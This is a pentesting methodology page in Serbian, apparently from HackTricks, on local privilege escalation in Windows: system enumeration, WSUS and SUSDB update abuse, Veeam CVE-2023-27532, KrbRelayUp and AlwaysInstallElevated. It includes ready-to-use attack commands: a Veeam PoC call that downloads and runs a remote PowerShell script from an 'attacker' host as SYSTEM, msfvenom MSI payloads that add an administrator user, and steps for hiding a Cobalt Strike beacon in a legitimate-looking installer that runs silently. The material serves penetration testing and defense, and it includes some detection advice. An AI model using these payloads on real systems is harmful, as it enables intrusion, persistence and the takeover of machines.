# Lokalna eskalacija privilegija u Windows-u

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za pronalaženje vektora za lokalnu eskalaciju privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ova stranica objedinjuje opštu metodologiju za eskalaciju privilegija u Windows-u iz nekoliko osnovnih vodiča.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Praktični tok enumeracije oslanja se i na radionice i kontrolne liste iz zajednice.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Istorijski materijal o napadima obuhvata DerbyCon prezentaciju o eskalaciji privilegija u Windows-u.<sup>[[5]](#references)</sup>

## Osnove Windows-a

### Tokeni pristupa

**Ako ne znate šta su Windows tokeni pristupa, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL-ovi - DACL-ovi/SACL-ovi/ACE-ovi

**Više informacija o ACL-ovima - DACL-ovima/SACL-ovima/ACE-ovima potražite na sledećoj stranici:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Nivoi integriteta

**Ako ne znate šta su nivoi integriteta u Windows-u, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Bezbednosne kontrole Windows-a

U Windows-u postoje različiti mehanizmi koji mogu **da vas spreče da enumerišete sistem**, pokrećete izvršne datoteke ili čak **otkriju vaše aktivnosti**. Pre nego što započnete enumeraciju radi eskalacije privilegija, trebalo bi da **pročitate** sledeću **stranicu** i **proverite** sve ove **mehanizme odbrane**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fizički pristup može i da pretvori izmenu UEFI NVRAM-a van mreže u DMA napad pre pokretanja sistema i niz koraka za izmenu memorije Windows procesa `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Zaštita administratora / tiha elevacija UIAccess procesa

UIAccess procesi pokrenuti preko `RAiLaunchAdminProcess` mogu se zloupotrebiti za dostizanje High IL-a bez upita, kada se zaobiđu AppInfo provere bezbedne putanje. Pogledajte namenski tok rada za zaobilaženje UIAccess/zaštite administratora:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagacija registra pristupačnosti Secure Desktop-a može se zloupotrebiti za proizvoljan upis u registar kao SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Novije verzije Windows-a uvele su i LPE putanju preko **SMB-a na proizvoljnom portu**, gde se privilegovana lokalna NTLM autentifikacija reflektuje preko ponovo korišćene SMB TCP veze:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacije o sistemu

### Enumeracija informacija o verziji

Proverite da li postoje poznate ranjivosti za verziju Windows-a (proverite i primenjene zakrpe).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Eksploiti po verziji

Ovaj [sajt](https://msrc.microsoft.com/update-guide/vulnerability) koristan je za pronalaženje detaljnih informacija o Microsoft bezbednosnim ranjivostima. Ova baza podataka sadrži više od 4.700 bezbednosnih ranjivosti, što pokazuje **ogromnu površinu za napad** koju pruža Windows okruženje.

**Na sistemu**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — prikuplja podatke o verziji OS-a, instaliranim ažuriranjima i mogućim kandidatima na osnovu odabranih bezbednosnih obaveštenja; pre nego što rezultat smatrate primenljivim, proverite tačan proizvod i naknadna ažuriranja.

Za lokalni exploit specifičan za određenu verziju proverite **arhitekturu pokrenutog procesa**, kao i arhitekturu OS-a. Na 64-bitnom Windowsu, 32-bitni proces podleže [preusmeravanju sistema datoteka WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` se obično odnosi na 32-bitni sistemski direktorijum, dok `%windir%\Sysnative` tom procesu omogućava pristup nativnom sistemskom direktorijumu. Ovaj alias nije dostupan 64-bitnom procesu. Verzija OS-a ili kandidat za nedostajuće KB ažuriranje ne dokazuje da je sistem ranjiv na exploit; uporedite pokrenutu verziju, instalirano ili naknadno ažuriranje, arhitekturu procesa i preduslove za exploit sa [Microsoft bezbednosnim biltenom](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) za konkretan problem.

**Lokalno, uz informacije o sistemu**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repozitorijumi exploita:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Da li su neki credential/Juicy podaci sačuvani u promenljivama okruženja?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Istorija PowerShell-a

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript datoteke

Možete saznati kako da ovo uključite na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` je samo primer. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) obično zapisuje datoteke u fasciklu Documents svakog korisnika, ali podešavanje `OutputDirectory` ili `Start-Transcript -OutputDirectory` može da ih preusmeri u deljenu ili skrivenu fasciklu. Pre pregledanja transkripta proverite efektivnu putanju za izlaz i ACL datoteke: transkript može da sadrži argumente komandi i izlaz, uključujući kredencijale. Transkript koji može da se pročita predstavlja trag samo ako njegov sadržaj otkriva upotrebljiv identitet sa višim privilegijama i ako taj identitet može da se prijavi u relevantnom kontekstu.

### Module Logging

Beleže se detalji izvršavanja PowerShell pipeline-a, uključujući izvršene komande, pozive komandi i delove skripti. Međutim, možda neće biti zabeleženi svi detalji izvršavanja i rezultati izlaza.

Da biste ovo omogućili, pratite uputstva u odeljku „Datoteke transkripta“ u dokumentaciji i izaberite **„Module Logging“** umesto **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Da biste videli poslednjih 15 događaja iz PowersShell logova, možete da izvršite:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Beleže se potpuna aktivnost i celokupan sadržaj izvršavanja skripte, čime se osigurava da se svaki blok koda dokumentuje tokom izvršavanja. Ovaj proces čuva sveobuhvatan revizijski trag svake aktivnosti, koristan za forenziku i analizu zlonamernog ponašanja. Dokumentovanjem svih aktivnosti u trenutku izvršavanja pruža se detaljan uvid u proces.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Događaji evidentiranja za Script Block mogu se pronaći u Windows Event Viewer-u na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Da biste prikazali poslednjih 20 događaja, možete koristiti:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Internet podešavanja

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Diskovi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP WSUS endpoint je trag koji treba proveriti zbog mogućeg presretanja metapodataka ažuriranja. Eksploatacija takođe zavisi od toga da li klijent koristi taj WSUS server, da li napadač može da presretne ili kontroliše njegov saobraćaj, kao i od klijentovih pravila poverenja i instalacije ažuriranja. Sam URL ne potvrđuje mogućnost izvršavanja koda. [Microsoft preporučuje TLS za WSUS metapodatke](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Prvo proverite da li mreža koristi WSUS ažuriranje bez SSL-a tako što ćete pokrenuti sledeće u cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ili sledeće u PowerShell-u:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ako dobijete odgovor kao što je neki od ovih:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

I ako je `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jednako `1`.

Kada je `UseWUServer` postavljen na `1`, Windows Update koristi konfigurisanu intranet uslugu. To potvrđuje jedan od preduslova za HTTP interception, ali ne dokazuje da je moguće presretanje, prihvatanje zlonamernih ažuriranja ili instalacija s povišenim privilegijama. Kada je vrednost `0`, ta konkretna konfigurisana WSUS krajnja tačka nije izabrana ovom politikom.

Da biste iskoristili ove ranjivosti, možete koristiti alate kao što su: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Ovo su MiTM skripte za eksploataciju spremne za upotrebu, kojima se ubacuju „lažna“ ažuriranja u nešifrovani WSUS saobraćaj.

Istraživanje pročitajte ovde:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Pročitajte kompletan izveštaj ovde**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Ukratko, ovo je propust koji ova greška iskorišćava:

> Ako možemo da izmenimo proxy podešavanja lokalnog korisnika, a Windows Updates koristi proxy konfigurisan u podešavanjima Internet Explorer-a, onda možemo lokalno pokrenuti [PyWSUS](https://github.com/GoSecure/pywsus) da bismo presreli sopstveni saobraćaj i pokrenuli kod kao korisnik s povišenim privilegijama na našem sistemu.
>
> Štaviše, pošto WSUS usluga koristi podešavanja trenutnog korisnika, koristiće i njegovo skladište sertifikata. Ako generišemo samopotpisani sertifikat za WSUS hostname i dodamo ga u skladište sertifikata trenutnog korisnika, moći ćemo da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi mehanizme slične HSTS-u za proveru sertifikata po principu prvog korišćenja. Ako korisnik veruje predstavljenom sertifikatu i on sadrži ispravan hostname, usluga će ga prihvatiti.

Ovu ranjivost možete iskoristiti alatom [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (kada bude objavljen).

### Ažuriranja pod kontrolom WSUS administratora

Postoji zaseban put kada trenutni identitet može da **objavljuje i odobrava** ažuriranja na WSUS serveru. Proverite efektivno članstvo u grupi `WSUS Administrators` na serveru i sva delegirana WSUS ovlašćenja, a zatim utvrdite koja grupa računara klijenata bi primila odobreno ažuriranje. [Microsoft zahteva WSUS Administrator privilegije za odobravanje ažuriranja](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) i [dokumentuje odnos poverenja pri objavljivanju](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klijenti moraju da veruju potpisnom sertifikatu koji se koristi za lokalno objavljeni sadržaj. Pre nego što ovo smatrate putem za eskalaciju, potvrdite da je kandidat za ažuriranje potpisan i prihvaćen, da se odnosi na cilj i da je instaliran u kontekstu s višim privilegijama. Sama HTTP vrednost `WUServer` ili naziv grupe ne potvrđuju da su ti uslovi ispunjeni.

### Zloupotreba prilagođenih ažuriranja u SUSDB: nepotpisani payload-ovi preko `.txt`/`.esd`

Ovo je drugačiji propust u granici poverenja od presretanja HTTP WSUS veze: preduslov je dovoljan pristup **uskladištenim procedurama WSUS baze podataka (`SUSDB`)** za objavljivanje i odobravanje prilagođenog ažuriranja. Jedan praktičan način za početni pristup je relay WSUS računara na uzvodnom WSUS serveru ka zasebnom MSSQL serveru na kom se nalazi `SUSDB`; tačan preduslov zavisi od implementacije, zato prvo navedite `EXECUTE` dozvole umesto da pretpostavite da su potrebna SQL administratorska prava.<sup>[[38]](#references)[[39]](#references)</sup>

Za zaseban napadni put koji relay-uje WSUS klijentsku autentifikaciju sa HTTP/8530 na LDAP, SMB ili AD CS, pogledajte [Zloupotreba WSUS HTTP-a za NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Izrada, ciljanje i odobravanje ažuriranja

Tok rada za prilagođena ažuriranja koristi legitimne WSUS procedure kao ograničeni API za objavljivanje. Važni prelazi stanja su:<sup>[[38]](#references)</sup>

| Faza | Relevantne uskladištene procedure |
| --- | --- |
| Uvoz metapodataka ažuriranja | `spImportUpdate` |
| Čuvanje XML fragmenata za preduslove, lokalizaciju i proširenja | `spSaveXMLFragment` |
| Povezivanje sažetka sadržaja sa URL-om koji kontroliše napadač | `spSetBatchURL` |
| Navođenje/kreiranje grupe računara i dodavanje klijenta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Odobravanje instalacije za tu grupu | `spDeployUpdate` sa `@actionID = 0` i `@isAssigned = 1` |

Naziv fajla, sažeci sadržaja, veličina i rukovalac `CommandLineInstallation` moraju da se podudaraju u uvezenim metapodacima i fragmentima. Nakon dodeljivanja URL-a sadržaja i ciljne grupe, konačno odobrenje izgleda ovako; koristite nove identifikatore ažuriranja, grupe i implementacije umesto da ponovo koristite primer GUID-ova.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Zaobilaženje provere potpisa zasnovano na ekstenziji

WSUS obično odbacuje proizvoljan nepotpisan izvršni sadržaj. Međutim, u datoteci `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, putanja .NET metode `VerifyFile` postavlja zastavicu za proveru sertifikata na false kada se naziv prosleđene datoteke završava sa `.txt` ili `.esd`; `CheckCertificateSignature` se tada preskače, a da se prethodno ne utvrdi da li su bajtovi tekst ili legitimna ESD slika. Zato neizmenjeni PE nazvan, na primer, `payload.exe.txt` može da prođe proveru sadržaja, a zatim ga može pokrenuti rukovalac komandne linije za instalaciju ažuriranja. Ovo je greška u politici/proveri tipa, a ne falsifikovanje potpisa.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Postavljanje i automatizacija kompatibilni sa BITS-om

Poziv `spDeployUpdate` navodi WSUS da preuzme registrovani sadržaj. Izvor mora da ispuni HTTP očekivanja BITS-a: sama dostupnost URL-a nije dovoljna jer prenos koristi početni tok `HEAD`/`GET` i zahteve za opseg bajtova. Server bez podrške za Range izaziva WSUS grešku sinhronizacije `EventId=364`, koja navodi da BITS zahteva zaglavlje protokola Range.<sup>[[39]](#references)</sup>

Istraživački PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiše SQL potreban za lanac import/fragment/URL/group/deployment, uključuje izmenjeni MSSQL klijent za njegovo izvršavanje i sadrži `BitsWebServer.py` za postavljanje sadržaja. Minimalni primer pokretanja u ovlašćenom laboratorijskom okruženju:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Nepraćeno izvršavanje i postojanost kroz ponovne pokušaje

Interakcija na strani klijenta zavisi od pravilnika. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcija `4 - Auto download and schedule install`, omogućava preuzimanje i instaliranje odobrenog ažuriranja prema konfigurisanom rasporedu, bez potrebe da ga korisnik ručno izabere. Tokom testiranja, payload čije ažuriranje je ostalo neuspešno/nepotpuno odmah je ponovo ponuđen nakon završetka callback procesa, pa ponašanje pri ponovnom pokušaju može postati postojana ponavljana egzekucija; pritom je upadljivo jer klijent prikazuje stanje neuspelog ažuriranja.<sup>[[39]](#references)</sup>

#### Tačke za detekciju i ojačavanje bezbednosti

Korisne tačke za proveru na serveru i klijentu u ovom lancu su:<sup>[[39]](#references)</sup>

- Revidirajte izvršavanje `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` u `SUSDB`; istražite nove ciljne grupe, spoljne izvore sadržaja, `.txt`/`.esd` payloade ažuriranja i primene koje obavljaju neočekivani principal-i (naročito nalozi koji nisu računari).
- Pregledajte `C:\Program Files\Update Services\LogFiles` i tražite `ContentSyncAgent`, `FileVerified`, pogrešno napisano `FileVerficationFailed` i `EventId=364`; korelišite verifikaciju sa ekstenzijom payloada i magičnim bajtovima sadržaja, umesto da verujete sufiksu.
- Tražite slučajeve ponovljenog neuspeha/ponovnih pokušaja instalacije Windows Update-a, kao i PE izvršavanje ili neočekivane podređene procese/mrežnu aktivnost sadržaja sa nazivima `.txt` ili `.esd`.
- Zahtevajte Extended Protection for Authentication za uslugu baze podataka tamo gde je podržan i ograničite mrežni pristup bazi podataka na WSUS server i ovlašćene administrativne sisteme. Svedite `EXECUTE` prava nad procedurama za prilagođena ažuriranja na minimum i revidirajte ih.

## Ažurirači trećih strana i Agent IPC (lokalni privesc)

Mnogi enterprise agenti izlažu IPC površinu na localhost-u i privilegovani kanal za ažuriranje. Ako se upis može preusmeriti na napadačev server, a ažurirač veruje lažnom root CA-u ili primenjuje slabe provere potpisnika, lokalni korisnik može isporučiti zlonamerni MSI koji instalira SYSTEM servis. Ovde pogledajte uopštenu tehniku (zasnovanu na Netskope stAgentSvc lancu – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM preko TCP 9401)

Veeam Backup & Replication i Cloud Connect podrazumevano koriste osnovnu uslugu za pravljenje rezervnih kopija na **TCP/9401**. [Veeam-ovo bezbednosno obaveštenje](https://www.veeam.com/kb4424) opisuje neautentifikovano otkrivanje šifrovanih akreditiva baze podataka za konfiguraciju unutar perimetra mreže za pravljenje rezervnih kopija; zaseban javni PoC demonstrira putanju do izvršavanja komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Usluga može da se veže i izvan localhost-a, zato proverite njenu stvarnu adresu i PID.

- **Izviđanje**: potvrdite da TCP/9401 pripada procesu `Veeam.Backup.Service.exe`, pa pregledajte instalirani proizvod i metapodatke zakrpa. `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` jesu naznake, ali ne predstavljaju potpunu proveru zakrpa.
- **Fiksne minimalne verzije**: Veeam navodi **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** kao prva izdanja sa ispravkom; starija izdanja su pogođena. Sama četvorodelna verzija datoteke ne može da razlikuje nezakrpljenu osnovnu verziju od kasnije zakrpe na istim brojevima verzije. Pre nego što verziju na granici proglasite ispravljenom, proverite identifikator zakrpe u [istoriji build-ova proizvođača](https://www.veeam.com/kb2680).
- **Eksploatacija**: smestite PoC kao što je `VeeamHax.exe` zajedno sa potrebnim Veeam DLL-ovima u isti direktorijum, pa pokrenite SYSTEM payload preko lokalnog socketa:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Navedeni PoC demonstrira izvršavanje komandi kao SYSTEM kada su ispunjeni dodatni preduslovi; savetodavno obaveštenje proizvođača opisuje problem otkrivanja akreditiva.
## KrbRelayUp

Lokalni Kerberos relay može da omogući prelaz sa prijave sa nižim privilegijama na privilegovani upis u direktorijum kada se odgovarajući COM server autentifikuje, a relayed principal ima prava nad ciljnim objektom. [KrbRelay dokumentuje](https://github.com/cube0x0/KrbRelay) LDAP upise za RBCD i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatizuje neke od ovih puteva. Lanac RBCD zahteva primenljivu delegaciju i prava nad ciljnim objektom, dok lanac shadow-credential zahteva prava upisa key-credential-a i KDC koji podržava putanju autentifikacije sertifikatom. Nijedna putanja ne proizlazi samo iz članstva u domenu.

Proverite stvarne smernice DC-a za [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL objekta za relayed identitet i nivoe autentifikacije i impersonation-a izabrane COM klase. Važni su tip prijave pozivaoca i kontekst akreditiva: WinRM sesija može da se ponaša drugačije od interaktivne prijave ili prijave sa novim akreditivima. Ruting kroz firewall/OXID i instalirane ispravke takođe mogu da utiču na ishod. Permisivnu smernicu ili ACL koji odgovara uslovima posmatrajte kao kandidata za proveru; pasivna enumeracija ne bi trebalo da pokreće COM coercion, relay autentifikaciju ili upise u direktorijum. Shadow credential za mašinski nalog može da dovede do mašinskog tiketa i, samo ako taj nalog ima potrebna prava replikacije direktorijuma, do zasebne DCSync putanje.

Pronađite **exploit u** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Više informacija o toku napada potražite na [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ako** su ova 2 ključa registra **omogućena** (vrednost je **0x1**), korisnici sa bilo kojim nivoom privilegija mogu da **instaliraju** (izvršavaju) `*.msi` datoteke kao NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ako imate meterpreter sesiju, ovu tehniku možete automatizovati pomoću modula **`exploit/windows/local/always_install_elevated`**

### PowerUP

Upotrebite komandu `Write-UserAddMSI` iz power-up-a da biste u trenutnom direktorijumu napravili Windows MSI binarnu datoteku za eskalaciju privilegija. Ova skripta ispisuje unapred kompajlirani MSI instalacioni program koji traži dodavanje korisnika/grupe (zato će vam biti potreban GIU pristup):

```
Write-UserAddMSI
```

Samo pokrenite kreirani binarni fajl da biste eskalirali privilegije.

### MSI Wrapper

Pročitajte ovaj vodič da biste saznali kako da napravite MSI wrapper pomoću ovog alata. Imajte na umu da možete da upakujete datoteku „**.bat**” ako samo želite da **izvršite** **komandne linije**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Pomoću Cobalt Strike ili Metasploit **generišite** novi **Windows EXE TCP payload** u `C:\privesc\beacon.exe`
- Otvorite **Visual Studio**, izaberite **Create a new project** i unesite „installer” u polje za pretragu. Izaberite projekat **Setup Wizard** i kliknite na **Next**.
- Dajte projektu ime, na primer **AlwaysPrivesc**, za lokaciju koristite **`C:\privesc`**, izaberite **place solution and project in the same directory** i kliknite na **Create**.
- Klikćite na **Next** dok ne dođete do trećeg koraka od četiri (izbor datoteka za uključivanje). Kliknite na **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite na **Finish**.
- Označite projekat **AlwaysPrivesc** u **Solution Explorer** i u odeljku **Properties** promenite **TargetPlatform** sa **x86** na **x64**.
  - Možete promeniti i druga svojstva, kao što su **Author** i **Manufacturer**, kako bi instalirana aplikacija izgledala legitimnije.
- Kliknite desnim tasterom miša na projekat i izaberite **View > Custom Actions**.
- Kliknite desnim tasterom miša na **Install** i izaberite **Add Custom Action**.
- Dvaput kliknite na **Application Folder**, izaberite datoteku **beacon.exe** i kliknite na **OK**. Time će se obezbediti da se Beacon payload izvrši čim se pokrene instalacioni program.
- U odeljku **Custom Action Properties** promenite **Run64Bit** na **True**.
- Na kraju, **izgradite projekat**.
  - Ako se prikaže upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proverite da li ste izabrali platformu x64.

### MSI Installation

Da biste izvršili **instalaciju** zlonamerne datoteke `.msi` u **pozadini:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Da biste iskoristili ovu ranjivost, možete koristiti: _exploit/windows/local/always_install_elevated_

## Antivirusni programi i detektori

### Podešavanja revizije

Ova podešavanja određuju šta se **beleži**, zato obratite pažnju.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding: zanimljivo je znati gde se šalju logovi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** je osmišljen za **upravljanje lozinkama lokalnog Administrator naloga**, čime se obezbeđuje da svaka lozinka bude **jedinstvena, nasumično generisana i redovno ažurirana** na računarima pridruženim domenu. Ove lozinke se bezbedno čuvaju u Active Directory-ju i mogu im pristupiti samo korisnici kojima su dodeljene dovoljne dozvole putem ACL-ova, što im omogućava da vide lozinke lokalnog administratora ako su ovlašćeni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **lozinke u čistom tekstu čuvaju se u LSASS-u** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest-u na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA zaštita

Počevši od **Windows 8.1**, Microsoft je uveo unapređenu zaštitu za Lokalni bezbednosni autoritet (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njegovu memoriju** ili ubacuju kod, čime se sistem dodatno štiti.\
[**Više informacija o LSA zaštiti ovde**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

